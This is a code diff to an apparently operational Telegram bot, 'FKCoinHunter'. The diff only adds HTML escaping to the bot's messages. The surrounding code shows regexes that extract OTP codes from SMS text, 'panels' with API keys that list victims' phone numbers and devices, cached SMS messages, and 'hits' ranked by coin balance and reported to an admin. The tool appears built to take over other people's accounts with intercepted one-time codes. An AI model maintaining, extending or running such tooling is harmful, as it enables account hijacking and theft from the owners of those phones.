@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
-FKCoinHunter - Telegram Bot v3.1 (complete fixed)
+FKCoinHunter - Telegram Bot v3.2
+Fixed: HTML escape in all dynamic content (no more 'cant parse entities')
 """
 
 import os
@@ -13,6 +14,7 @@ import re
 import secrets
 import base64
 import urllib.parse
+import html as html_lib
 import asyncio
 from datetime import datetime
 from typing import Optional, Dict, List, Set, Tuple
@@ -81,6 +83,15 @@ OTP_PATTERNS = [
     {"pattern": r"OTP[:\s]*(\d{4,6}).*?STAN", "keyword": "stan", "priority": 3},
     {"pattern": r"(\d{4,6})\s+is your OTP for STAN", "keyword": "stan", "priority": 4},
 ]
+
+# ============ HTML ESCAPE HELPER ============
+def _esc(s) -> str:
+    """Escape arbitrary content for Telegram HTML parse mode.
+    Handles None, non-str, and any raw < > & characters."""
+    if s is None:
+        return ""
+    return html_lib.escape(str(s))
+
 
 # ============ DATA ============
 @dataclass
@@ -644,9 +655,9 @@ class AccountManager:
                 auto_status['hits'] = self.stats['hits']
                 notify_admin(
                     f"⭐ <b>NEW HIT</b>\n"
-                    f"📱 <code>{acc.phone}</code>\n"
+                    f"📱 <code>{_esc(acc.phone)}</code>\n"
                     f"💰 <b>{acc.fk_balance} FK</b>\n"
-                    f"👤 {acc.username}"
+                    f"👤 {_esc(acc.username)}"
                 )
             self._append(acc)
             return True
@@ -987,17 +998,17 @@ def status_text() -> str:
     recent_hits = ""
     if s.get('recent_hits'):
         recent_hits = "\n\n🔥 <b>Recent Hits</b>\n" + "\n".join(
-            f"• <code>{h['phone']}</code> — <b>{h['balance']} FK</b> "
-            f"<i>({h['time']})</i>"
+            f"• <code>{_esc(h['phone'])}</code> — <b>{h['balance']} FK</b> "
+            f"<i>({_esc(h['time'])})</i>"
             for h in s['recent_hits'][-3:]
         )
 
     return (
         f"{icon} <b>FKCoinHunter</b> • <b>{state}</b>\n"
         f"━━━━━━━━━━━━━━━━━━\n"
-        f"📡 <b>Panel {panel_line}</b> — {s.get('current_panel') or '—'}\n"
-        f"⚙️ <b>Action:</b> {s.get('current_action', 'Idle')}\n"
-        f"📦 <b>Batch:</b> {s.get('batch_info') or '—'}\n"
+        f"📡 <b>Panel {panel_line}</b> — {_esc(s.get('current_panel') or '—')}\n"
+        f"⚙️ <b>Action:</b> {_esc(s.get('current_action', 'Idle'))}\n"
+        f"📦 <b>Batch:</b> {_esc(s.get('batch_info') or '—')}\n"
         f"👷 <b>Workers:</b> {s.get('active_workers', 0)}/{MAX_WORKERS} "
         f"{progress_bar(worker_pct)}\n"
         f"━━━━━━━━━━━━━━━━━━\n"
@@ -1011,7 +1022,7 @@ def status_text() -> str:
         f"━━━━━━━━━━━━━━━━━━\n"
         f"⭐ <b>Hits:</b> {fmt_num(st['hits'])} (≥ {HIT_THRESHOLD} FK)\n"
         f"💾 <b>Saved:</b> {fmt_num(st['saved_accounts'])} (≥ {MIN_FK_BALANCE} FK)\n"
-        f"🕒 <i>Updated {s.get('last_update','')[11:19]}</i>"
+        f"🕒 <i>Updated {_esc(s.get('last_update','')[11:19])}</i>"
         f"{recent_hits}"
     )
 
@@ -1094,22 +1105,23 @@ def hits_kb(page: int = 0, per_page: int = 8, sort: str = 'date'):
 
 
 def _hit_detail_text(h: Dict, idx: int) -> str:
-    phone = h.get('phone') or '?'
+    phone = _esc(h.get('phone') or '?')
     bal = h.get('fk_balance') or 0
-    uname = h.get('username') or '?'
-    uid = h.get('user_id') or '?'
+    uname = _esc(h.get('username') or '?')
+    uid = _esc(h.get('user_id') or '?')
     created = h.get('created_at') or '?'
-    created = created[:19] if isinstance(created, str) else str(created)
+    created = _esc(created[:19] if isinstance(created, str) else created)
     fburi = h.get('firebase_url') or '?'
-    fburi_short = fburi[:40] + "…" if len(fburi) > 40 else fburi
+    fburi_short = _esc(fburi[:40] + "…" if len(fburi) > 40 else fburi)
 
     msgs = ""
     raw_msgs = h.get('messages') or []
     if raw_msgs:
         for m in raw_msgs[:5]:
-            sender = m.get('sender') or 'Unknown'
+            sender = _esc(m.get('sender') or 'Unknown')
             full = str(m.get('text') or '')
             txt = full[:80] + ("…" if len(full) > 80 else "")
+            txt = _esc(txt)
             msgs += f"\n• <b>{sender}</b>: {txt}"
     else:
         msgs = "\n<i>No messages cached — tap Refresh.</i>"
@@ -1148,7 +1160,7 @@ def accounts_kb(page=0, per_page=8):
     for a in accs[start:end]:
         bal = a.get('fk_balance') or 0
         tag = "⭐" if bal >= HIT_THRESHOLD else "•"
-        lines.append(f"{tag} <code>{a.get('phone','?')}</code> — <b>{bal} FK</b>")
+        lines.append(f"{tag} <code>{_esc(a.get('phone','?'))}</code> — <b>{bal} FK</b>")
     kb = []
     nav = []
     if page > 0:
@@ -1318,8 +1330,10 @@ async def cmd_accounts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 async def cmd_logs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     logs = auto_status['processing_logs'][-30:]
     body = "📜 <b>Logs</b> (all)\n\n" + (
-        "\n".join(f"<code>{l['timestamp']}</code> {l['message'][:100]}"
-                  for l in logs) if logs else "<i>No logs yet.</i>"
+        "\n".join(
+            f"<code>{_esc(l['timestamp'])}</code> {_esc(l['message'][:100])}"
+            for l in logs
+        ) if logs else "<i>No logs yet.</i>"
     )
     if len(body) > 3800:
         body = body[-3800:]
@@ -1417,7 +1431,7 @@ async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         preview_lines = []
         for u in unique[:10]:
             short = u if len(u) <= 55 else u[:52] + "…"
-            preview_lines.append(f"• <code>{short}</code>")
+            preview_lines.append(f"• <code>{_esc(short)}</code>")
         if len(unique) > 10:
             preview_lines.append(f"<i>…and {len(unique) - 10} more</i>")
 
@@ -1433,7 +1447,7 @@ async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
     except Exception as e:
         logger.exception("on_document")
-        await update.message.reply_text(f"❌ Error: {str(e)[:200]}")
+        await update.message.reply_text(f"❌ Error: {_esc(str(e)[:200])}")
 
 
 # ============ CALLBACK DISPATCHER ============
@@ -1449,7 +1463,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         logger.exception(f"Callback {q.data} failed")
         try:
             await q.edit_message_text(
-                f"❌ <b>Error</b>\n<code>{str(e)[:300]}</code>",
+                f"❌ <b>Error</b>\n<code>{_esc(str(e)[:300])}</code>",
                 parse_mode=ParseMode.HTML,
                 reply_markup=InlineKeyboardMarkup([[
                     InlineKeyboardButton("🏠 Menu", callback_data="menu")
@@ -1458,7 +1472,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         except Exception:
             try:
                 await q.message.reply_text(
-                    f"❌ Error: {str(e)[:300]}",
+                    f"❌ Error: {_esc(str(e)[:300])}",
                     reply_markup=InlineKeyboardMarkup([[
                         InlineKeyboardButton("🏠 Menu", callback_data="menu")
                     ]])
@@ -1584,10 +1598,10 @@ async def _dispatch_callback(q, ctx):
             api_key = p.get('api_key') or 'none'
             await q.edit_message_text(
                 f"✅ <b>Panel activated</b>\n\n"
-                f"📡 <b>{p.get('name','?')}</b>\n"
-                f"🔗 <code>{p.get('url','?')}</code>\n"
-                f"🔑 Key: <code>{api_key[:20]}…</code>\n"
-                f"📨 Sender: <b>{p.get('sender','?')}</b>",
+                f"📡 <b>{_esc(p.get('name','?'))}</b>\n"
+                f"🔗 <code>{_esc(p.get('url','?'))}</code>\n"
+                f"🔑 Key: <code>{_esc(api_key[:20])}…</code>\n"
+                f"📨 Sender: <b>{_esc(p.get('sender','?'))}</b>",
                 parse_mode=ParseMode.HTML,
                 reply_markup=panels_kb())
         return
@@ -1605,8 +1619,8 @@ async def _dispatch_callback(q, ctx):
         p = panels[idx]
         await q.edit_message_text(
             f"🗑 <b>Delete panel?</b>\n\n"
-            f"📡 {p.get('name','?')}\n"
-            f"🔗 <code>{(p.get('url') or '')[:60]}…</code>",
+            f"📡 {_esc(p.get('name','?'))}\n"
+            f"🔗 <code>{_esc((p.get('url') or '')[:60])}…</code>",
             parse_mode=ParseMode.HTML,
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("🗑 Yes, delete",
@@ -1658,7 +1672,7 @@ async def _dispatch_callback(q, ctx):
             p = dm.get_current_panel() or {}
             await q.edit_message_text(
                 f"⏭ <b>Panel {dm.current_panel_index+1}/{len(dm.get_panels())}</b>\n\n"
-                f"📡 {p.get('name','?')}",
+                f"📡 {_esc(p.get('name','?'))}",
                 parse_mode=ParseMode.HTML, reply_markup=panels_kb())
         else:
             await q.edit_message_text("No panels.", reply_markup=panels_kb())
@@ -1674,12 +1688,12 @@ async def _dispatch_callback(q, ctx):
         devices = fetch_phones_from_panel(panel, limit=100)
         if not devices:
             await q.edit_message_text(
-                f"⚠️ No active devices in <b>{panel['name']}</b>",
+                f"⚠️ No active devices in <b>{_esc(panel.get('name','?'))}</b>",
                 parse_mode=ParseMode.HTML, reply_markup=panels_kb())
             return
-        lines = [f"📋 <b>{len(devices)} devices</b> in {panel['name']}\n"]
+        lines = [f"📋 <b>{len(devices)} devices</b> in {_esc(panel.get('name','?'))}\n"]
         for phone, dev in devices[:30]:
-            lines.append(f"📱 <code>{phone}</code>  <i>{dev[:8]}…</i>")
+            lines.append(f"📱 <code>{_esc(phone)}</code>  <i>{_esc(dev[:8])}…</i>")
         if len(devices) > 30:
             lines.append(f"\n<i>…and {len(devices)-30} more</i>")
         await q.edit_message_text(
@@ -1719,7 +1733,6 @@ async def _dispatch_callback(q, ctx):
         return
 
     if data.startswith("hv_"):
-        # hv_{sort}_{phone}
         parts = data.split("_", 2)
         if len(parts) < 3:
             return
@@ -1727,7 +1740,7 @@ async def _dispatch_callback(q, ctx):
         idx, h = am.hit_manager.get_hit_by_phone(phone)
         if not h:
             await q.edit_message_text(
-                f"⚠️ Hit not found.\n<i>The list may be outdated.</i>",
+                "⚠️ Hit not found.\n<i>The list may be outdated.</i>",
                 parse_mode=ParseMode.HTML,
                 reply_markup=InlineKeyboardMarkup([[
                     InlineKeyboardButton("🔙 Back to Hits",
@@ -1741,7 +1754,6 @@ async def _dispatch_callback(q, ctx):
         return
 
     if data.startswith("hr_"):
-        # hr_{sort}_{phone}
         parts = data.split("_", 2)
         if len(parts) < 3:
             return
@@ -1799,8 +1811,10 @@ async def _dispatch_callback(q, ctx):
             logs = [l for l in logs if l['type'] == filter_type]
         logs = logs[-30:]
         body = f"📜 <b>Logs</b> ({filter_type})\n\n" + (
-            "\n".join(f"<code>{l['timestamp']}</code> {l['message'][:100]}"
-                      for l in logs) if logs else "<i>No logs.</i>"
+            "\n".join(
+                f"<code>{_esc(l['timestamp'])}</code> {_esc(l['message'][:100])}"
+                for l in logs
+            ) if logs else "<i>No logs.</i>"
         )
         if len(body) > 3800:
             body = body[-3800:]
@@ -1877,7 +1891,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 unique.append(u)
         ctx.user_data['pending_urls'] = unique
         preview = "\n".join(
-            f"• <code>{(u if len(u) <= 55 else u[:52] + '…')}</code>"
+            f"• <code>{_esc(u if len(u) <= 55 else u[:52] + '…')}</code>"
             for u in unique[:10]
         )
         extra = (f"\n<i>…and {len(unique)-10} more</i>"
